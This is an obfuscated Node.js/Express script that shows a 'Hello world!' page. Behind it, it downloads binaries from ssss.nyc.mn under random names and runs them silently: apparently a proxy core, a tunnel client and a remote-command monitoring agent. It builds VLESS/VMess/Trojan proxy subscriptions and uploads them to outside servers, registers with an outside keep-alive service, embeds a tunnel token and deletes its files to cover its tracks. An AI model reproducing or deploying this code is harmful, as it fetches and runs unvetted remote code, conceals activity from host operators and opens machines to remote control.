function _0x1610(_0x5ccad2,_0x5cfb26){_0x5ccad2=_0x5ccad2-0x70;const _0x5f3ece=_0x5f3e();let _0x161024=_0x5f3ece[_0x5ccad2];return _0x161024;}const _0x1d6451=_0x1610;(function(_0x54434e,_0x9b884d){const _0x160081=_0x1610,_0xabff15=_0x54434e();while(!![]){try{const _0x52215f=-parseInt(_0x160081(0x8b))/0x1+parseInt(_0x160081(0xf4))/0x2*(-parseInt(_0x160081(0xb5))/0x3)+parseInt(_0x160081(0xab))/0x4+-parseInt(_0x160081(0x11b))/0x5+parseInt(_0x160081(0xba))/0x6*(-parseInt(_0x160081(0x86))/0x7)+-parseInt(_0x160081(0x97))/0x8+parseInt(_0x160081(0x7c))/0x9*(parseInt(_0x160081(0x9f))/0xa);if(_0x52215f===_0x9b884d)break;else _0xabff15['push'](_0xabff15['shift']());}catch(_0x3e10b2){_0xabff15['push'](_0xabff15['shift']());}}}(_0x5f3e,0xc1934));function _0x5f3e(){const _0x27014f=['unshift','\x20already\x20exists','/api/delete-nodes','sub.txt','Content-Type','Error\x20downloading\x20files:','createWriteStream','readFileSync','org','\x20successfully','\x20-p\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/agent','platform','direct','join','web\x20running\x20error:\x20','eyJhIjoiNTExOTQ4ZTRlM2RkMzA4ZTA0NmFkNzlmYTdjNDNkNDUiLCJ0IjoiNWEwMTQ3NzYtMzRlMS00NTkxLTg3OGItYTIyMzYyMmY3Y2EyIiwicyI6Ik5tWTBNelUwWXpVdE9HUm1OeTAwWW1WbExXRXlOakF0TVdVMVpEazJZalEyTXprdyJ9','response','tunnel.yml','NEZHA\x20variable\x20is\x20empty,skip\x20running','from','status','2386NxADEd','NEZHA_PORT','UPLOAD_URL','\x0a\x0atrojan://','express','match','false','./tmp','ARGO_PORT','tcp','9afd1229-b893-40c1-84dd-51e7ce204913','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20is\x20running','taskkill\x20/f\x20/im\x20','path','https://arm64.ssss.nyc.mn/agent','log','data','CFIP','https://oooo.serv00.net/add-url','\x20is\x20created','/vless-argo','App\x20is\x20running','tunnel.json','ARGO_DOMAIN:','send','https://arm64.ssss.nyc.mn/web','true','chmod','Download\x20','boot.log','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0a\x20\x20\x20\x20','Skipping\x20adding\x20automatic\x20access\x20task','fileUrl','country_code','catch','finish','&fp=firefox&type=ws&host=','652315GgFGgw','2053','split','writeFileSync','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/trojan-argo','\x20>\x20nul\x202>&1','unlink','SUB_PATH','/vmess-argo','floor','Empowerment\x20failed\x20for\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/v1','Hello\x20world!','map','listen','xtls-rprx-vision','ARGO_DOMAIN','quic','NEZHA_SERVER','win32','has','get','PORT','clear','Error\x20reading\x20boot.log:','\x0aclient_secret:\x20','FILE_PATH','/vmess-argo?ed=2560','TunnelSecret','php\x20running\x20error:\x20','length','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','message','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','http://ip-api.com/json/','push','\x22\x20>\x20/dev/null\x202>&1','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','http','cdns.doon.eu.org','&path=%2Fvless-argo%3Fed%3D2560#','ArgoDomain:','9enVfwe','config.yaml','arm64','filter','\x20-s\x20','mkdirSync','8443','\x20failed:\x20','?security=tls&sni=','substring','154zxOntS','Subscription\x20uploaded\x20successfully','ARGO_AUTH','automatic\x20access\x20task\x20added\x20successfully','none','830597vVCIdx','\x20-c\x20','toString','vmess','2096','statSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','success','Nodes\x20uploaded\x20successfully','NEZHA_KEY','https://ipapi.co/json/','Error\x20executing\x20command:\x20','10922832OGTpDQ','\x20>/dev/null\x202>&1\x20&','utf-8','unlinkSync','127.0.0.1','aarch64','rm\x20-rf\x20','?encryption=none&security=tls&sni=','28135960rVrFKz','application/json','amd','SERVER_PORT','sub','child_process','trojan','forEach','tls','then','http\x20server\x20is\x20running\x20on\x20port:','Empowerment\x20success\x20for\x20','3626396cFBvUk','vless','/tunnel.yml\x20run','stream','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','CFPORT','https://amd64.ssss.nyc.mn/web','https://amd64.ssss.nyc.mn/bot','stringify','includes','429kdTXQM','all','\x20-c\x20\x22','NAME','env','117354SFjeKU','firefox','error','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','block','charAt','https://northflank.mywayout.dpdns.org/','abcdefghijklmnopqrstuvwxyz','2087','.exe\x20>\x20nul\x202>&1','https://arm64.ssss.nyc.mn/bot','/dev/null','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','2083','test','post','arm','Add\x20automatic\x20access\x20task\x20faild:\x20','fileName','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0a\x0avmess://','countryCode','base64','basename','\x20>/dev/null\x202>&1','pkill\x20-f\x20\x22[','/config.json\x20>/dev/null\x202>&1\x20&','UUID','&path=%2Ftrojan-argo%3Fed%3D2560#','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','exec','nohup\x20','/api/add-nodes','config.json','existsSync'];_0x5f3e=function(){return _0x27014f;};return _0x5f3e();}const express=require(_0x1d6451(0xf8)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x1d6451(0x102)),{promisify}=require('util'),exec=promisify(require(_0x1d6451(0xa4))[_0x1d6451(0xd8)]),{execSync}=require(_0x1d6451(0xa4)),UPLOAD_URL=process['env'][_0x1d6451(0xf6)]||'',PROJECT_URL=process[_0x1d6451(0xb9)]['PROJECT_URL']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x1d6451(0x137)]||_0x1d6451(0xfb),SUB_PATH=process['env'][_0x1d6451(0x123)]||_0x1d6451(0xa3),PORT=process[_0x1d6451(0xb9)][_0x1d6451(0xa2)]||process[_0x1d6451(0xb9)][_0x1d6451(0x133)]||0xbb8,UUID=process[_0x1d6451(0xb9)][_0x1d6451(0xd5)]||_0x1d6451(0xfe),NEZHA_SERVER=process[_0x1d6451(0xb9)][_0x1d6451(0x12f)]||'',NEZHA_PORT=process[_0x1d6451(0xb9)][_0x1d6451(0xf5)]||'',NEZHA_KEY=process[_0x1d6451(0xb9)][_0x1d6451(0x94)]||'',ARGO_DOMAIN=process[_0x1d6451(0xb9)][_0x1d6451(0x12d)]||_0x1d6451(0xc0),ARGO_AUTH=process[_0x1d6451(0xb9)][_0x1d6451(0x88)]||_0x1d6451(0xee),ARGO_PORT=process[_0x1d6451(0xb9)][_0x1d6451(0xfc)]||0x929,CFIP=process[_0x1d6451(0xb9)][_0x1d6451(0x106)]||_0x1d6451(0x79),CFPORT=process['env'][_0x1d6451(0xb0)]||0x1bb,NAME=process[_0x1d6451(0xb9)][_0x1d6451(0xb8)]||'';!fs[_0x1d6451(0xdc)](FILE_PATH)?(fs[_0x1d6451(0x81)](FILE_PATH),console[_0x1d6451(0x104)](FILE_PATH+_0x1d6451(0x108))):console['log'](FILE_PATH+_0x1d6451(0xde));function generateRandomName(){const _0x3332a6=_0x1d6451,_0x2887b6=_0x3332a6(0xc1);let _0x50188d='';for(let _0x1825f4=0x0;_0x1825f4<0x6;_0x1825f4++){_0x50188d+=_0x2887b6[_0x3332a6(0xbf)](Math[_0x3332a6(0x125)](Math['random']()*_0x2887b6['length']));}return _0x50188d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x1d6451(0xec)](FILE_PATH,phpName),webPath=path[_0x1d6451(0xec)](FILE_PATH,webName),botPath=path[_0x1d6451(0xec)](FILE_PATH,botName),subPath=path[_0x1d6451(0xec)](FILE_PATH,_0x1d6451(0xe0)),listPath=path[_0x1d6451(0xec)](FILE_PATH,'list.txt'),bootLogPath=path[_0x1d6451(0xec)](FILE_PATH,'boot.log'),configPath=path[_0x1d6451(0xec)](FILE_PATH,_0x1d6451(0xdb));function deleteNodes(){const _0x4b80d0=_0x1d6451;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xcf570;try{_0xcf570=fs[_0x4b80d0(0xe4)](subPath,_0x4b80d0(0x99));}catch{return null;}const _0x2f0e69=Buffer[_0x4b80d0(0xf2)](_0xcf570,_0x4b80d0(0xd0))['toString'](_0x4b80d0(0x99)),_0x146727=_0x2f0e69[_0x4b80d0(0x11d)]('\x0a')['filter'](_0x42978b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4b80d0(0xc8)](_0x42978b));if(_0x146727['length']===0x0)return;return axios[_0x4b80d0(0xc9)](UPLOAD_URL+_0x4b80d0(0xdf),JSON['stringify']({'nodes':_0x146727}),{'headers':{'Content-Type':_0x4b80d0(0xa0)}})[_0x4b80d0(0x118)](_0x50ae03=>{return null;}),null;}catch(_0x23541f){return null;}}function cleanupOldFiles(){const _0x520b7a=_0x1d6451;try{const _0x1cbeda=fs['readdirSync'](FILE_PATH);_0x1cbeda[_0x520b7a(0xa6)](_0x500c5b=>{const _0x502322=_0x520b7a,_0x1fa6ac=path[_0x502322(0xec)](FILE_PATH,_0x500c5b);try{const _0x2d8d36=fs[_0x502322(0x90)](_0x1fa6ac);_0x2d8d36['isFile']()&&fs[_0x502322(0x9a)](_0x1fa6ac);}catch(_0x4a837d){}});}catch(_0xf5c885){}}app['get']('/',function(_0x2272b3,_0x3786a0){const _0x1772c6=_0x1d6451;_0x3786a0[_0x1772c6(0x10d)](_0x1772c6(0x129));});async function generateConfig(){const _0x241641=_0x1d6451,_0x26f653={'log':{'access':_0x241641(0xc5),'error':'/dev/null','loglevel':_0x241641(0x8a)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x241641(0xac),'settings':{'clients':[{'id':UUID,'flow':_0x241641(0x12c)}],'decryption':_0x241641(0x8a),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x241641(0x124),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x241641(0xfd)}},{'port':0xbb9,'listen':_0x241641(0x9b),'protocol':_0x241641(0xac),'settings':{'clients':[{'id':UUID}],'decryption':_0x241641(0x8a)},'streamSettings':{'network':_0x241641(0xfd),'security':_0x241641(0x8a)}},{'port':0xbba,'listen':_0x241641(0x9b),'protocol':_0x241641(0xac),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x241641(0x8a)},'streamSettings':{'network':'ws','security':_0x241641(0x8a),'wsSettings':{'path':_0x241641(0x109)}},'sniffing':{'enabled':!![],'destOverride':[_0x241641(0x78),_0x241641(0xa7),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x241641(0x9b),'protocol':_0x241641(0x8e),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x241641(0x78),_0x241641(0xa7),_0x241641(0x12e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x241641(0x9b),'protocol':_0x241641(0xa5),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x241641(0x120)}},'sniffing':{'enabled':!![],'destOverride':[_0x241641(0x78),'tls',_0x241641(0x12e)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x241641(0xeb)},{'protocol':'blackhole','tag':_0x241641(0xbe)}]};fs[_0x241641(0x11e)](path[_0x241641(0xec)](FILE_PATH,'config.json'),JSON[_0x241641(0xb3)](_0x26f653,null,0x2));}function getSystemArchitecture(){const _0x4d3b48=_0x1d6451,_0x87c9f7=os['arch']();return _0x87c9f7===_0x4d3b48(0xca)||_0x87c9f7===_0x4d3b48(0x7e)||_0x87c9f7===_0x4d3b48(0x9c)?_0x4d3b48(0xca):_0x4d3b48(0xa1);}function downloadFile(_0x45ec3e,_0x1c427b,_0x39f7c9){const _0x5a0f18=_0x1d6451,_0xc6bb92=_0x45ec3e;!fs[_0x5a0f18(0xdc)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x1e92d9=fs[_0x5a0f18(0xe3)](_0xc6bb92);axios({'method':'get','url':_0x1c427b,'responseType':_0x5a0f18(0xae)})[_0x5a0f18(0xa8)](_0xdc6609=>{const _0x56fdfe=_0x5a0f18;_0xdc6609[_0x56fdfe(0x105)]['pipe'](_0x1e92d9),_0x1e92d9['on'](_0x56fdfe(0x119),()=>{const _0x280ef2=_0x56fdfe;_0x1e92d9['close'](),console[_0x280ef2(0x104)]('Download\x20'+path[_0x280ef2(0xd1)](_0xc6bb92)+_0x280ef2(0xe6)),_0x39f7c9(null,_0xc6bb92);}),_0x1e92d9['on'](_0x56fdfe(0xbc),_0x2cc556=>{const _0x410e53=_0x56fdfe;fs[_0x410e53(0x122)](_0xc6bb92,()=>{});const _0x2a704b=_0x410e53(0x111)+path[_0x410e53(0xd1)](_0xc6bb92)+'\x20failed:\x20'+_0x2cc556[_0x410e53(0x72)];console[_0x410e53(0xbc)](_0x2a704b),_0x39f7c9(_0x2a704b);});})['catch'](_0xacaeb8=>{const _0x3a81b2=_0x5a0f18,_0x5df9fe=_0x3a81b2(0x111)+path['basename'](_0xc6bb92)+_0x3a81b2(0x83)+_0xacaeb8[_0x3a81b2(0x72)];console[_0x3a81b2(0xbc)](_0x5df9fe),_0x39f7c9(_0x5df9fe);});}async function downloadFilesAndRun(){const _0x1aba66=_0x1d6451,_0x182412=getSystemArchitecture(),_0x30477d=getFilesForArchitecture(_0x182412);if(_0x30477d['length']===0x0){console['log'](_0x1aba66(0x11f));return;}const _0xdce051=_0x30477d[_0x1aba66(0x12a)](_0x22540f=>{return new Promise((_0x2ddc59,_0x5ba778)=>{const _0x402606=_0x1610;downloadFile(_0x22540f[_0x402606(0xcc)],_0x22540f[_0x402606(0x116)],(_0x2d18ec,_0x37c74d)=>{_0x2d18ec?_0x5ba778(_0x2d18ec):_0x2ddc59(_0x37c74d);});});});try{await Promise[_0x1aba66(0xb6)](_0xdce051);}catch(_0x1832e8){console[_0x1aba66(0xbc)](_0x1aba66(0xe2),_0x1832e8);return;}function _0x2687e9(_0xd84871){const _0x285c1d=_0x1aba66,_0x1f595b=0x1fd;_0xd84871[_0x285c1d(0xa6)](_0x132d6b=>{const _0x4277c0=_0x285c1d;fs[_0x4277c0(0xdc)](_0x132d6b)&&fs[_0x4277c0(0x110)](_0x132d6b,_0x1f595b,_0x1bcc6e=>{const _0x5055d0=_0x4277c0;_0x1bcc6e?console[_0x5055d0(0xbc)](_0x5055d0(0x126)+_0x132d6b+':\x20'+_0x1bcc6e):console[_0x5055d0(0x104)](_0x5055d0(0xaa)+_0x132d6b+':\x20'+_0x1f595b[_0x5055d0(0x8d)](0x8));});});}const _0x4c3950=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2687e9(_0x4c3950);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1bbcf4=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1aba66(0x11d)](':')['pop']():'',_0x45de10=new Set(['443','8443',_0x1aba66(0x8f),_0x1aba66(0xc2),_0x1aba66(0xc7),_0x1aba66(0x11c)]),_0x2a00e8=_0x45de10[_0x1aba66(0x131)](_0x1bbcf4)?_0x1aba66(0x10f):_0x1aba66(0xfa),_0xbd3f6b=_0x1aba66(0x136)+NEZHA_KEY+_0x1aba66(0x113)+NEZHA_SERVER+_0x1aba66(0x71)+_0x2a00e8+_0x1aba66(0x73)+UUID;fs[_0x1aba66(0x11e)](path['join'](FILE_PATH,_0x1aba66(0x7d)),_0xbd3f6b);const _0x8c241c=_0x1aba66(0xd9)+phpPath+_0x1aba66(0xb7)+FILE_PATH+_0x1aba66(0xd7);try{await exec(_0x8c241c),console[_0x1aba66(0x104)](phpName+_0x1aba66(0x100)),await new Promise(_0x427436=>setTimeout(_0x427436,0x3e8));}catch(_0x46fcf6){console[_0x1aba66(0xbc)](_0x1aba66(0x13a)+_0x46fcf6);}}else{let _0x359bee='';const _0x3b811d=['443',_0x1aba66(0x82),_0x1aba66(0x8f),'2087',_0x1aba66(0xc7),_0x1aba66(0x11c)];_0x3b811d[_0x1aba66(0xb4)](NEZHA_PORT)&&(_0x359bee='--tls');const _0x288d1f=_0x1aba66(0xd9)+npmPath+_0x1aba66(0x80)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1aba66(0xe7)+NEZHA_KEY+'\x20'+_0x359bee+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x288d1f),console[_0x1aba66(0x104)](npmName+_0x1aba66(0x100)),await new Promise(_0x20767c=>setTimeout(_0x20767c,0x3e8));}catch(_0x2d4a4a){console[_0x1aba66(0xbc)]('npm\x20running\x20error:\x20'+_0x2d4a4a);}}}else console[_0x1aba66(0x104)](_0x1aba66(0xf1));const _0x41e49a=_0x1aba66(0xd9)+webPath+_0x1aba66(0x8c)+FILE_PATH+_0x1aba66(0xd4);try{await exec(_0x41e49a),console[_0x1aba66(0x104)](webName+_0x1aba66(0x100)),await new Promise(_0x4940ff=>setTimeout(_0x4940ff,0x3e8));}catch(_0x187c9f){console[_0x1aba66(0xbc)](_0x1aba66(0xed)+_0x187c9f);}if(fs['existsSync'](botPath)){let _0x39391e;if(ARGO_AUTH[_0x1aba66(0xf9)](/^[A-Z0-9a-z=]{120,250}$/))_0x39391e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x1aba66(0xf9)](/TunnelSecret/)?_0x39391e='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x1aba66(0xad):_0x39391e=_0x1aba66(0xff)+FILE_PATH+_0x1aba66(0xaf)+ARGO_PORT;try{await exec(_0x1aba66(0xd9)+botPath+'\x20'+_0x39391e+'\x20>/dev/null\x202>&1\x20&'),console[_0x1aba66(0x104)](botName+'\x20is\x20running'),await new Promise(_0x4aa785=>setTimeout(_0x4aa785,0x7d0));}catch(_0x230a93){console[_0x1aba66(0xbc)](_0x1aba66(0x96)+_0x230a93);}}await new Promise(_0x5a8b8d=>setTimeout(_0x5a8b8d,0x1388));}function getFilesForArchitecture(_0x520082){const _0x3d8624=_0x1d6451;let _0x386d83;_0x520082==='arm'?_0x386d83=[{'fileName':webPath,'fileUrl':_0x3d8624(0x10e)},{'fileName':botPath,'fileUrl':_0x3d8624(0xc4)}]:_0x386d83=[{'fileName':webPath,'fileUrl':_0x3d8624(0xb1)},{'fileName':botPath,'fileUrl':_0x3d8624(0xb2)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x54da90=_0x520082===_0x3d8624(0xca)?_0x3d8624(0x103):_0x3d8624(0xe9);_0x386d83[_0x3d8624(0xdd)]({'fileName':npmPath,'fileUrl':_0x54da90});}else{const _0x2ac8b6=_0x520082===_0x3d8624(0xca)?'https://arm64.ssss.nyc.mn/v1':_0x3d8624(0x128);_0x386d83[_0x3d8624(0xdd)]({'fileName':phpPath,'fileUrl':_0x2ac8b6});}}return _0x386d83;}function argoType(){const _0x2eeaa4=_0x1d6451;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2eeaa4(0x104)](_0x2eeaa4(0xcd));return;}if(ARGO_AUTH[_0x2eeaa4(0xb4)](_0x2eeaa4(0x139))){fs[_0x2eeaa4(0x11e)](path['join'](FILE_PATH,_0x2eeaa4(0x10b)),ARGO_AUTH);const _0x46acb8='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x2eeaa4(0x11d)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x2eeaa4(0xec)](FILE_PATH,_0x2eeaa4(0x10b))+_0x2eeaa4(0x127)+ARGO_DOMAIN+_0x2eeaa4(0xe8)+ARGO_PORT+_0x2eeaa4(0xbd);fs[_0x2eeaa4(0x11e)](path['join'](FILE_PATH,_0x2eeaa4(0xf0)),_0x46acb8);}else console['log'](_0x2eeaa4(0xc6));}async function extractDomains(){const _0x254f16=_0x1d6451;let _0x154c6f;if(ARGO_AUTH&&ARGO_DOMAIN)_0x154c6f=ARGO_DOMAIN,console['log'](_0x254f16(0x10c),_0x154c6f),await _0x195bfb(_0x154c6f);else try{const _0x2c2dd0=fs[_0x254f16(0xe4)](path[_0x254f16(0xec)](FILE_PATH,_0x254f16(0x112)),_0x254f16(0x99)),_0x2ef0c3=_0x2c2dd0[_0x254f16(0x11d)]('\x0a'),_0x3e14c7=[];_0x2ef0c3['forEach'](_0x2d34a5=>{const _0x1306e7=_0x254f16,_0x99e5f9=_0x2d34a5[_0x1306e7(0xf9)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x99e5f9){const _0x40dc46=_0x99e5f9[0x1];_0x3e14c7[_0x1306e7(0x75)](_0x40dc46);}});if(_0x3e14c7[_0x254f16(0x70)]>0x0)_0x154c6f=_0x3e14c7[0x0],console[_0x254f16(0x104)](_0x254f16(0x7b),_0x154c6f),await _0x195bfb(_0x154c6f);else{console[_0x254f16(0x104)](_0x254f16(0x91)),fs[_0x254f16(0x9a)](path['join'](FILE_PATH,_0x254f16(0x112)));async function _0x243b09(){const _0xc8fef1=_0x254f16;try{process[_0xc8fef1(0xea)]==='win32'?await exec(_0xc8fef1(0x101)+botName+_0xc8fef1(0xc3)):await exec(_0xc8fef1(0xd3)+botName[_0xc8fef1(0xbf)](0x0)+']'+botName[_0xc8fef1(0x85)](0x1)+_0xc8fef1(0x76));}catch(_0x32316e){}}_0x243b09(),await new Promise(_0x140fe7=>setTimeout(_0x140fe7,0xbb8));const _0x3fd062=_0x254f16(0xff)+FILE_PATH+_0x254f16(0xaf)+ARGO_PORT;try{await exec(_0x254f16(0xd9)+botPath+'\x20'+_0x3fd062+_0x254f16(0x98)),console['log'](botName+_0x254f16(0x100)),await new Promise(_0x36ffc0=>setTimeout(_0x36ffc0,0xbb8)),await extractDomains();}catch(_0x529c56){console[_0x254f16(0xbc)](_0x254f16(0x96)+_0x529c56);}}}catch(_0x29ac07){console[_0x254f16(0xbc)](_0x254f16(0x135),_0x29ac07);}async function _0x415082(){const _0x53de2f=_0x254f16;try{const _0x532a84=await axios[_0x53de2f(0x132)](_0x53de2f(0x95),{'timeout':0xbb8});if(_0x532a84['data']&&_0x532a84[_0x53de2f(0x105)][_0x53de2f(0x117)]&&_0x532a84['data']['org'])return _0x532a84['data']['country_code']+'_'+_0x532a84['data'][_0x53de2f(0xe5)];}catch(_0x25897e){try{const _0xc480b7=await axios['get'](_0x53de2f(0x74),{'timeout':0xbb8});if(_0xc480b7[_0x53de2f(0x105)]&&_0xc480b7[_0x53de2f(0x105)][_0x53de2f(0xf3)]===_0x53de2f(0x92)&&_0xc480b7['data'][_0x53de2f(0xcf)]&&_0xc480b7['data'][_0x53de2f(0xe5)])return _0xc480b7['data'][_0x53de2f(0xcf)]+'_'+_0xc480b7[_0x53de2f(0x105)][_0x53de2f(0xe5)];}catch(_0x53c40b){}}return'Unknown';}async function _0x195bfb(_0x4615a8){const _0x2a271a=await _0x415082(),_0x141d1e=NAME?NAME+'-'+_0x2a271a:_0x2a271a;return new Promise(_0x327d5d=>{setTimeout(()=>{const _0x505c89=_0x1610,_0x595926={'v':'2','ps':''+_0x141d1e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x505c89(0x8a),'net':'ws','type':'none','host':_0x4615a8,'path':_0x505c89(0x138),'tls':_0x505c89(0xa7),'sni':_0x4615a8,'alpn':'','fp':_0x505c89(0xbb)},_0x3355b2='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x505c89(0x9e)+_0x4615a8+_0x505c89(0x11a)+_0x4615a8+_0x505c89(0x7a)+_0x141d1e+_0x505c89(0xce)+Buffer['from'](JSON[_0x505c89(0xb3)](_0x595926))[_0x505c89(0x8d)](_0x505c89(0xd0))+_0x505c89(0xf7)+UUID+'@'+CFIP+':'+CFPORT+_0x505c89(0x84)+_0x4615a8+_0x505c89(0x11a)+_0x4615a8+_0x505c89(0xd6)+_0x141d1e+_0x505c89(0x114);console[_0x505c89(0x104)](Buffer[_0x505c89(0xf2)](_0x3355b2)[_0x505c89(0x8d)]('base64')),fs[_0x505c89(0x11e)](subPath,Buffer[_0x505c89(0xf2)](_0x3355b2)[_0x505c89(0x8d)](_0x505c89(0xd0))),console[_0x505c89(0x104)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x505c89(0x132)]('/'+SUB_PATH,(_0x31a00b,_0x25e6c7)=>{const _0x318778=_0x505c89,_0x59c5cf=Buffer[_0x318778(0xf2)](_0x3355b2)[_0x318778(0x8d)](_0x318778(0xd0));_0x25e6c7['set'](_0x318778(0xe1),'text/plain;\x20charset=utf-8'),_0x25e6c7[_0x318778(0x10d)](_0x59c5cf);}),_0x327d5d(_0x3355b2);},0x7d0);});}}async function uploadNodes(){const _0x1ec170=_0x1d6451;if(UPLOAD_URL&&PROJECT_URL){const _0x4dd968=PROJECT_URL+'/'+SUB_PATH,_0x2075e6={'subscription':[_0x4dd968]};try{const _0x8b3ecd=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x2075e6,{'headers':{'Content-Type':_0x1ec170(0xa0)}});return _0x8b3ecd&&_0x8b3ecd[_0x1ec170(0xf3)]===0xc8?(console[_0x1ec170(0x104)](_0x1ec170(0x87)),_0x8b3ecd):null;}catch(_0x48d16e){if(_0x48d16e[_0x1ec170(0xef)]){if(_0x48d16e[_0x1ec170(0xef)][_0x1ec170(0xf3)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1ec170(0xdc)](listPath))return;const _0x10a792=fs[_0x1ec170(0xe4)](listPath,_0x1ec170(0x99)),_0x2eaeda=_0x10a792['split']('\x0a')[_0x1ec170(0x7f)](_0x58bc71=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1ec170(0xc8)](_0x58bc71));if(_0x2eaeda['length']===0x0)return;const _0x4400d1=JSON[_0x1ec170(0xb3)]({'nodes':_0x2eaeda});try{const _0x2b7457=await axios['post'](UPLOAD_URL+_0x1ec170(0xda),_0x4400d1,{'headers':{'Content-Type':_0x1ec170(0xa0)}});return _0x2b7457&&_0x2b7457['status']===0xc8?(console['log'](_0x1ec170(0x93)),_0x2b7457):null;}catch(_0x31c549){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3b9762=_0x1610,_0x1e9fb9=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1e9fb9[_0x3b9762(0x75)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1e9fb9[_0x3b9762(0x75)](phpPath);process[_0x3b9762(0xea)]===_0x3b9762(0x130)?exec('del\x20/f\x20/q\x20'+_0x1e9fb9[_0x3b9762(0xec)]('\x20')+_0x3b9762(0x121),_0x4444a4=>{const _0x20c803=_0x3b9762;console['clear'](),console[_0x20c803(0x104)](_0x20c803(0x10a)),console[_0x20c803(0x104)](_0x20c803(0x77));}):exec(_0x3b9762(0x9d)+_0x1e9fb9[_0x3b9762(0xec)]('\x20')+_0x3b9762(0xd2),_0x191e13=>{const _0x2afc3e=_0x3b9762;console[_0x2afc3e(0x134)](),console[_0x2afc3e(0x104)](_0x2afc3e(0x10a)),console[_0x2afc3e(0x104)](_0x2afc3e(0x77));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4c4c93=_0x1d6451;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4c4c93(0x104)](_0x4c4c93(0x115));return;}try{const _0x2b3348=await axios['post'](_0x4c4c93(0x107),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4c4c93(0xa0)}});return console['log'](_0x4c4c93(0x89)),_0x2b3348;}catch(_0x4b2b8e){return console['error'](_0x4c4c93(0xcb)+_0x4b2b8e[_0x4c4c93(0x72)]),null;}}async function startserver(){const _0x2dc7ff=_0x1d6451;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4947b3){console[_0x2dc7ff(0xbc)]('Error\x20in\x20startserver:',_0x4947b3);}}startserver()['catch'](_0x417ea0=>{const _0x58ecea=_0x1d6451;console[_0x58ecea(0xbc)]('Unhandled\x20error\x20in\x20startserver:',_0x417ea0);}),app[_0x1d6451(0x12b)](PORT,()=>console[_0x1d6451(0x104)](_0x1d6451(0xa9)+PORT+'!'));
